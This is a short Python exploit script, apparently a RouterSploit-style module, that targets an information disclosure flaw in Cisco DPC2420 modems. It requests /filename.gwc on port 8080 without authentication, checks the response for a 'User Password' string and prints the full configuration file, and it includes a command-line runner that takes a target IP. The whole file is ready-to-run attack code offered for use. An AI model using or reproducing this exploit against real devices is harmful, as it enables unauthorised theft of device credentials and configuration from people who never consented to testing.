target = ""
# rsf exploit module
# description: Module exploits Cisco DPC2420 information disclosure vulnerability which allows reading sensitive information from the configuration file.

import requests

class Exploit:
    def __init__(self):
        self.target = ""
        self.port = 8080
        self.session = requests.Session()
        
    def run(self):
        try:
            response = self.session.get(
                f"http://{self.target}:{self.port}/filename.gwc",
                timeout=10
            )
            
            if response.status_code == 200 and "User Password" in response.text:
                print("[+] Exploit success - reading configuration file filename.gwc")
                print(response.text)
            else:
                print("[-] Exploit failed - could not read configuration file")
        except Exception as e:
            print(f"[-] Error: {str(e)}")
    
    def check(self):
        try:
            response = self.session.get(
                f"http://{self.target}:{self.port}/filename.gwc",
                timeout=10
            )
            
            if response.status_code == 200 and "User Password" in response.text:
                return True
            return False
        except:
            return False



import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
